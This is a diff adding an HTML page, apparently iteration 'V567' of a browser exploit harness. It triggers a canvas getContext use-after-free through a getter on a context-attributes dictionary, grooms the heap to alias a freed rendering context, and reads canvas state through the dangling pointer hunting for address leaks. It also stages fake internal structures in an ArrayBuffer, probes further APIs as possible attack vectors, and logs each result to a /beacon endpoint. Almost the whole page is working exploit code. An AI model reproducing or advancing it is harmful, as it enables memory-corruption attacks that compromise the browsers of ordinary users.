@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V567</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V567-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+function heapWarmup768(){
+  var warmup=[];
+  for(var i=0;i<100;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    warmup.push(c.getContext('2d'));
+  }
+  warmup=null;
+  var fresh=[];
+  for(var i=0;i<50;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    fresh.push(c.getContext('2d'));
+  }
+  return fresh;
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx,canvas:outer};
+}
+
+function lightGC(){
+  for(var g=0;g<5;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+beacon('BOOT','V567-ab-statestack');
+
+// =============================================
+// PHASE 1: Same-type alias (proven V562 approach)
+// To identify the 768B slot address relative to itself
+// =============================================
+var warmupCtxs=heapWarmup768();
+beacon('WARMUP','kept='+warmupCtxs.length);
+
+var u=triggerUAF();
+// Use SAME-TYPE reclaim first to establish the alias
+var r={contexts:[],canvases:[]};
+for(var i=0;i<200;i++){
+  var c=document.createElement('canvas');c.width=10;c.height=10;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=200+i;
+  r.contexts.push(ctx);r.canvases.push(c);
+}
+
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+beacon('T1','aliasIdx='+idx+'|lw='+lw);
+
+if(idx<0||idx>=200||lw<200||lw>=400){
+  beacon('FAIL','alias-failed');
+  setTimeout(function(){location.reload()},3000);
+  throw new Error('STOP');
+}
+
+var danglingCtx=u.ctx;
+var aliasCtx=r.contexts[idx];
+var aliasCvs=r.canvases[idx];
+
+// Null out UAF source to prevent double-access
+u.ctx=null;u=null;
+
+// =============================================
+// T2: Verify alias is alive and bidirectional
+// =============================================
+aliasCtx.lineWidth=999.5;
+var readback=danglingCtx.lineWidth;
+beacon('T2','bidir|set=999.5|got='+readback+'|ok='+(readback===999.5));
+
+// =============================================
+// T3: Read ALL accessible double fields through the dangling ctx
+// These read from State fields at known offsets
+// =============================================
+(function(){
+  try{
+    // Set distinctive values through aliasCtx
+    aliasCtx.lineWidth=12345.678;      // State+48
+    aliasCtx.miterLimit=98765.432;     // State+64
+    aliasCtx.globalAlpha=0.123456789;  // State+96
+    aliasCtx.lineDashOffset=55555.5;   // State+184
+    aliasCtx.shadowOffsetX=111.111;    // State+72 (float)
+    aliasCtx.shadowOffsetY=222.222;    // State+76 (float)
+    aliasCtx.shadowBlur=333.333;       // State+80 (float)
+    aliasCtx.setTransform(1.1,2.2,3.3,4.4,5.5,6.6); // State+112..159
+
+    // Read back through dangling ctx
+    var lw=danglingCtx.lineWidth;
+    var ml=danglingCtx.miterLimit;
+    var ga=danglingCtx.globalAlpha;
+    var ldo=danglingCtx.lineDashOffset;
+    var sox=danglingCtx.shadowOffsetX;
+    var soy=danglingCtx.shadowOffsetY;
+    var sb=danglingCtx.shadowBlur;
+    var t=danglingCtx.getTransform();
+
+    beacon('T3A','lw='+lw+'|ml='+ml+'|ga='+ga+'|ldo='+ldo);
+    beacon('T3B','sox='+sox+'|soy='+soy+'|sb='+sb);
+    beacon('T3C','ta='+t.a+'|tb='+t.b+'|tc='+t.c+'|td='+t.d+'|te='+t.e+'|tf='+t.f);
+  }catch(e){beacon('T3','ERR:'+e.message)}
+})();
+
+// =============================================
+// T4: Read fields that AREN'T writable doubles
+// Check for unexpected values (possible pointer leaks)
+// =============================================
+(function(){
+  try{
+    // Set fillStyle to a gradient to put a POINTER at State+32
+    var g=aliasCtx.createLinearGradient(0,0,100,100);
+    g.addColorStop(0,'red');g.addColorStop(1,'blue');
+    aliasCtx.fillStyle=g;
+
+    // Now read fillStyle through dangling ctx
+    var fs=danglingCtx.fillStyle;
+    var fsType=typeof fs;
+    var fsStr=String(fs);
+    beacon('T4A','fillStyle-type='+fsType+'|str='+fsStr.substring(0,100));
+
+    // Read strokeStyle (should be default '#000000')
+    var ss=danglingCtx.strokeStyle;
+    beacon('T4B','strokeStyle='+String(ss).substring(0,100));
+
+    // Read shadowColor (uint64 Color at State+88)
+    var sc=danglingCtx.shadowColor;
+    beacon('T4C','shadowColor='+sc);
+
+    // Read lineCap/lineJoin (uint8_t enums)
+    var lc=danglingCtx.lineCap;
+    var lj=danglingCtx.lineJoin;
+    beacon('T4D','lineCap='+lc+'|lineJoin='+lj);
+
+    // Read compositeOperation
+    var co=danglingCtx.globalCompositeOperation;
+    beacon('T4E','composite='+co);
+  }catch(e){beacon('T4','ERR:'+e.message)}
+})();
+
+// =============================================
+// T5: Set fillStyle to gradient, then read the transform
+// doubles that are NEAR the fillStyle pointer field.
+// State+32 = fillStyle (contains gradient pointer when set)
+// State+48 = lineWidth (readable double)
+// Gap = 16 bytes. Transform = State+112..159
+// =============================================
+(function(){
+  try{
+    // Set gradient (puts pointer at State+32-39)
+    var g=aliasCtx.createLinearGradient(0,0,100,100);
+    aliasCtx.fillStyle=g;
+    // Also set pattern
+    var tc=document.createElement('canvas');tc.width=2;tc.height=2;
+    var tctx=tc.getContext('2d');
+    tctx.fillStyle='blue';tctx.fillRect(0,0,2,2);
+    var pat=aliasCtx.createPattern(tc,'repeat');
+    aliasCtx.strokeStyle=pat;
+
+    // Now read ALL transform values — they should be normal doubles
+    var t=danglingCtx.getTransform();
+    beacon('T5A','transform|a='+t.a+'|b='+t.b+'|c='+t.c+'|d='+t.d+'|e='+t.e+'|f='+t.f);
+
+    // Read lineWidth — right after fillStyle, should be our set value
+    beacon('T5B','lineWidth='+danglingCtx.lineWidth);
+
+    // Now try: read the lineDash — it internally reads m_buffer, m_size
+    var ld=danglingCtx.getLineDash();
+    beacon('T5C','lineDash-len='+ld.length);
+  }catch(e){beacon('T5','ERR:'+e.message)}
+})();
+
+// =============================================
+// T6: CRITICAL TEST — AB(768) reclaim with pre-filled data
+// Theory: V552 crashed because zero-init AB → NULL m_stateStack.
+// Fix: write valid-ish data at AB offset 112 BEFORE reading.
+// We use a SECOND triggerUAF to avoid single-UAF rule... WAIT
+// WE CANNOT do a second UAF. So we test a different way:
+// Create an AB(768), write data at offsets 112-127 that would
+// form a valid stateStack, and verify the pattern.
+// =============================================
+(function(){
+  try{
+    // Just verify we can write to specific AB offsets
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    var f64=new Float64Array(ab);
+
+    // Write a recognizable double at offset 48 (where lineWidth would be)
+    dv.setFloat64(48,31337.31337,true);
+
+    // Write fake stateStack header at offset 112
+    // m_buffer = THIS AB's own address (we'd need to know it)
+    // For now, write zeros to show we CAN write there
+    dv.setFloat64(112,0,true);  // m_buffer = 0 (placeholder)
+    dv.setUint32(120,1,true);   // m_capacity = 1
+    dv.setUint32(124,1,true);   // m_size = 1
+
+    // Read back
+    var rb48=dv.getFloat64(48,true);
+    var rb112=dv.getFloat64(112,true);
+    var rb120=dv.getUint32(120,true);
+    var rb124=dv.getUint32(124,true);
+
+    beacon('T6','abWrite|o48='+rb48+'|o112='+rb112+'|o120='+rb120+'|o124='+rb124);
+  }catch(e){beacon('T6','ERR:'+e.message)}
+})();
+
+// =============================================
+// T7: Test if we can leak addresses through FinalizationRegistry
+// =============================================
+(function(){
+  try{
+    var collected=[];
+    var fr=new FinalizationRegistry(function(held){
+      collected.push(held);
+    });
+
+    // Register objects with held values
+    for(var i=0;i<5;i++){
+      var obj={idx:i};
+      fr.register(obj,'held-'+i);
+      obj=null;
+    }
+
+    // Force GC
+    lightGC();
+    for(var i=0;i<10;i++){
+      var big=new ArrayBuffer(1024*1024);
+      big=null;
+    }
+    lightGC();
+
+    // Check if callbacks fired
+    beacon('T7','finreg|collected='+collected.length+'|vals='+collected.join(','));
+  }catch(e){beacon('T7','ERR:'+e.message)}
+})();
+
+// =============================================
+// T8: WeakRef — can we detect when objects are collected?
+// =============================================
+(function(){
+  try{
+    var refs=[];
+    for(var i=0;i<10;i++){
+      var obj={idx:i,pad:new ArrayBuffer(1024)};
+      refs.push(new WeakRef(obj));
+      obj=null;
+    }
+
+    lightGC();
+    for(var i=0;i<10;i++){
+      var big=new ArrayBuffer(1024*1024);
+      big=null;
+    }
+    lightGC();
+
+    var alive=0,dead=0;
+    for(var i=0;i<refs.length;i++){
+      if(refs[i].deref()!==undefined) alive++; else dead++;
+    }
+    beacon('T8','weakref|alive='+alive+'|dead='+dead);
+  }catch(e){beacon('T8','ERR:'+e.message)}
+})();
+
+// =============================================
+// T9: Test datalist element support (for CVE-2026-64783)
+// =============================================
+(function(){
+  try{
+    var dl=document.createElement('datalist');
+    var supported=(dl.toString()==='[object HTMLDataListElement]');
+    var opt=document.createElement('option');
+    opt.value='test';
+    dl.appendChild(opt);
+    var input=document.createElement('input');
+    input.setAttribute('list','dl1');
+    dl.id='dl1';
+    document.body.appendChild(dl);
+    document.body.appendChild(input);
+
+    var hasList=(input.list!==undefined&&input.list!==null);
+    var listTag=input.list?input.list.tagName:'null';
+    var optCount=dl.options?dl.options.length:-1;
+
+    beacon('T9','datalist='+supported+'|hasList='+hasList+'|listTag='+listTag+'|opts='+optCount);
+
+    // Clean up
+    document.body.removeChild(dl);
+    document.body.removeChild(input);
+  }catch(e){beacon('T9','ERR:'+e.message)}
+})();
+
+// =============================================
+// T10: Test IntersectionObserver (potential UAF vector)
+// =============================================
+(function(){
+  try{
+    if(typeof IntersectionObserver==='undefined'){
+      beacon('T10','IO=NO');
+      return;
+    }
+    var entries=[];
+    var io=new IntersectionObserver(function(e){
+      for(var i=0;i<e.length;i++) entries.push(e[i].isIntersecting);
+    });
+    var div=document.createElement('div');
+    div.style.width='10px';div.style.height='10px';
+    document.body.appendChild(div);
+    io.observe(div);
+
+    // Sync check
+    beacon('T10A','IO=YES|entries='+entries.length);
+
+    // Async check after microtask
+    Promise.resolve().then(function(){
+      beacon('T10B','entries='+entries.length+'|vals='+entries.join(','));
+      io.disconnect();
+      document.body.removeChild(div);
+    });
+  }catch(e){beacon('T10','ERR:'+e.message)}
+})();
+
+// =============================================
+// T11: Performance API — check for detailed timing
+// =============================================
+(function(){
+  try{
+    var t0=performance.now();
+    var sum=0;
+    for(var i=0;i<100000;i++) sum+=i;
+    var t1=performance.now();
+    var delta=t1-t0;
+
+    // Check performance entries
+    var navEntries=performance.getEntriesByType?performance.getEntriesByType('navigation'):[];
+    var resEntries=performance.getEntriesByType?performance.getEntriesByType('resource'):[];
+
+    beacon('T11','delta='+delta.toFixed(6)+'|nav='+navEntries.length+'|res='+resEntries.length);
+
+    if(navEntries.length>0){
+      var n=navEntries[0];
+      beacon('T11B','fetchStart='+n.fetchStart+'|domComplete='+n.domComplete);
+    }
+  }catch(e){beacon('T11','ERR:'+e.message)}
+})();
+
+// =============================================
+// T12: MessageChannel — test structured clone for info
+// =============================================
+(function(){
+  try{
+    var mc=new MessageChannel();
+    var received=false;
+    mc.port2.onmessage=function(e){
+      received=true;
+      beacon('T12B','got='+JSON.stringify(e.data).substring(0,200));
+    };
+    mc.port1.postMessage({test:42,ab:new ArrayBuffer(8)});
+    beacon('T12A','sent');
+
+    // The onmessage fires asynchronously
+    setTimeout(function(){
+      if(!received) beacon('T12C','timeout');
+    },100);
+  }catch(e){beacon('T12','ERR:'+e.message)}
+})();
+
+// =============================================
+// T13: Alias health check
+// =============================================
+aliasCtx.lineWidth=42.42;
+var finalLW=danglingCtx.lineWidth;
+beacon('T13','alias-final|set=42.42|got='+finalLW+'|ok='+(finalLW===42.42));
+
+beacon('DONE','V567-complete');
+</script>
+</body></html>
